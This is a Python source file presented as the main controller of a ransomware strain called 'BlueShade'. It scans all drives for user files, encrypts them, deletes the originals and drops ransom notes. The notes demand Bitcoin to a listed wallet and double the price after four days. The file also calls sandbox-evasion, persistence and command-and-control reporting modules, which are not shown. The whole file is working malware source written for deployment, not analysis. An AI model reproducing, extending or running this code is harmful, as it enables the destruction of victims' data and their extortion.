#!/usr/bin/env python3
# main.py - Main controller for BlueShade ransomware
# Handles encryption, communication, and payment processing
# Make sure setup.py has been run before using this!

import os
import sys
import time
import random
import threading
import base64
from pathlib import Path
from datetime import datetime, timedelta

# Import our modules
try:
    from modules import crypto, comms, persistence, evasion
except ImportError:
    print("[!] Error: Required modules not found")
    print("[!] Run setup.py first")
    sys.exit(1)

# Unique campaign ID - change for each deployment
CAMPAIGN_ID = "BS_25Q2_ENT5"
# Ransom amount in BTC
BTC_AMOUNT = 0.35
# Days until price doubles
PRICE_DOUBLE_DAYS = 4
# Exclusion list - don't encrypt these or we break functionality
EXCLUDED_DIRS = [
    "Windows", "Program Files", "Program Files (x86)", 
    "ProgramData", "AppData", "$Recycle.Bin", "System Volume Information"
]
EXCLUDED_EXTENSIONS = [
    ".exe", ".dll", ".sys", ".msi", ".blueshade"
]

class BlueShade:
    def __init__(self):
        self.home_dir = Path.home()
        self.working_dir = self.get_working_dir()
        self.log_file = self.working_dir / "activity.log"
        self.targets = []
        self.encrypted_count = 0
        self.key = None
        self.comms_ready = False
        
    def get_working_dir(self):
        """Get our previously created working directory"""
        if os.name == 'nt':
            return Path.home() / "AppData" / "Local" / "Microsoft" / "Windows" / "Cache"
        else:
            return Path.home() / ".cache" / ".system_update"
    
    def log(self, message):
        """Log activity - useful for debugging but remove in prod"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {message}"
        
        try:
            with open(self.log_file, "a") as f:
                f.write(log_entry + "\n")
        except:
            pass  # Silent failure
    
    def create_ransom_note(self, path):
        """Create the ransom note in target directory"""
        note_content = f"""
ATTENTION! YOUR FILES HAVE BEEN ENCRYPTED
--------------------------------------

Your documents, photos, databases and other important files have been encrypted with a strong algorithm.

To decrypt your files, you need to:
1. Pay {BTC_AMOUNT} BTC to the wallet address: 1Hf12vcW8Vp5wVz6j5KG3yXBzrJwkzKMuu
2. Send proof of payment to reclaim@bluecontrol[.]xyz with your ID: {CAMPAIGN_ID}
3. We will send you the decryption tool

You have {PRICE_DOUBLE_DAYS} days to pay this amount. After that, the price will double.

DO NOT:
- Do not use third-party decryption tools - they will permanently damage your files
- Do not modify the encrypted files
- Do not reinstall your operating system

For proof that we can decrypt your files, send us 3 files and we will decrypt them for free.

--------------------------------------
Your personal ID: {CAMPAIGN_ID}
Encryption Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
"""
        
        try:
            # Create ransom note in the directory
            with open(path / "RESTORE_FILES.txt", "w") as f:
                f.write(note_content)
            
            # Also create on desktop for visibility
            if os.name == 'nt':
                desktop = Path.home() / "Desktop"
            else:
                desktop = Path.home() / "Desktop"
                
            if desktop.exists():
                with open(desktop / "RESTORE_FILES.txt", "w") as f:
                    f.write(note_content)
                    
            return True
        except:
            return False
    
    def should_encrypt_file(self, file_path):
        """Determine if we should encrypt this file"""
        # Skip if in excluded dir
        for excluded in EXCLUDED_DIRS:
            if excluded in str(file_path):
                return False
                
        # Skip by extension
        file_ext = file_path.suffix.lower()
        if file_ext in EXCLUDED_EXTENSIONS:
            return False
            
        # Don't encrypt tiny files - waste of time
        try:
            if file_path.stat().st_size < 1024:  # 1KB
                return False
        except:
            return False
            
        # Check if already encrypted
        if file_path.suffix == ".blueshade":
            return False
            
        return True
    
    def find_targets(self):
        """Find files to encrypt"""
        self.log("Starting target discovery")
        
        drives = []
        
        # Find drives to target
        if os.name == 'nt':
            # Windows: check all drives
            from ctypes import windll
            drives_bitmask = windll.kernel32.GetLogicalDrives()
            for letter in range(ord('A'), ord('Z')+1):
                if drives_bitmask & (1 << (letter - ord('A'))):
                    drive = f"{chr(letter)}:\\"
                    drives.append(Path(drive))
        else:
            # Linux/Mac: target home directory and mounted volumes
            drives.append(Path.home())
            if Path("/media").exists():
                drives.append(Path("/media"))
            if Path("/mnt").exists():
                drives.append(Path("/mnt"))
        
        self.log(f"Found {len(drives)} drives/locations to scan")
        
        # Limit to 1000 files for testing
        max_files = 1000
        
        # Find files to encrypt
        for drive in drives:
            try:
                for root, dirs, files in os.walk(str(drive)):
                    # Remove excluded dirs
                    dirs[:] = [d for d in dirs if d not in EXCLUDED_DIRS]
                    
                    for file in files:
                        file_path = Path(root) / file
                        if self.should_encrypt_file(file_path):
                            self.targets.append(file_path)
                            if len(self.targets) >= max_files:
                                return
            except:
                continue
                
        self.log(f"Found {len(self.targets)} files to encrypt")
    
    def encrypt_file(self, file_path):
        """Encrypt a single file"""
        try:
            # Read file content
            with open(file_path, "rb") as f:
                data = f.read()
                
            # Encrypt data with our key
            encrypted_data = crypto.encrypt_file_data(data, self.key)
            
            # Write encrypted data back
            encrypted_path = Path(str(file_path) + ".blueshade")
            with open(encrypted_path, "wb") as f:
                f.write(encrypted_data)
                
            # Remove original file
            os.remove(file_path)
            
            self.encrypted_count += 1
            return True
        except:
            return False
    
    def encrypt_all(self):
        """Encrypt all target files"""
        self.log("Starting encryption process")
        
        # Generate encryption key
        self.key = crypto.generate_key()
        
        # Save encrypted key for restoration later
        encrypted_key = crypto.encrypt_key_with_public(self.key)
        with open(self.working_dir / "keydata.bin", "wb") as f:
            f.write(encrypted_key)
        
        # Start encryption
        for file_path in self.targets:
            success = self.encrypt_file(file_path)
            # Small delay to avoid maxing out CPU
            time.sleep(0.01)
            
        self.log(f"Encrypted {self.encrypted_count} files")
        
        # Create ransom notes in various directories
        directories = set(file.parent for file in self.targets)
        for directory in directories:
            self.create_ransom_note(directory)
    
    def run(self):
        """Main execution flow"""
        self.log("BlueShade starting execution")
        
        # Check if already ran
        if (self.working_dir / "keydata.bin").exists():
            self.log("Already encrypted this system. Exiting.")
            return
        
        # Basic evasion techniques
        if not evasion.is_safe_environment():
            self.log("Unsafe environment detected. Exiting.")
            return
        
        # Establish C2 communication
        try:
            self.comms_ready = comms.establish_connection(CAMPAIGN_ID)
        except:
            # Continue even if C2 is unavailable
            pass
        
        # Start persistence mechanism in background
        threading.Thread(target=persistence.establish, daemon=True).start()
        
        # Find files to encrypt
        self.find_targets()
        
        # Don't continue if we have too few targets
        if len(self.targets) < 20:
            self.log("Too few targets found. Exiting.")
            return
            
        # Start encryption
        self.encrypt_all()
        
        # Report back to C2 if connection available
        if self.comms_ready:
            try:
                comms.report_status(CAMPAIGN_ID, self.encrypted_count)
            except:
                pass
                
        self.log("Execution complete")

# Only run if executed directly
if __name__ == "__main__":
    # Small delay to avoid immediate execution
    time.sleep(random.uniform(1, 3))
    
    # Run main logic
    ransomware = BlueShade()
    ransomware.run()
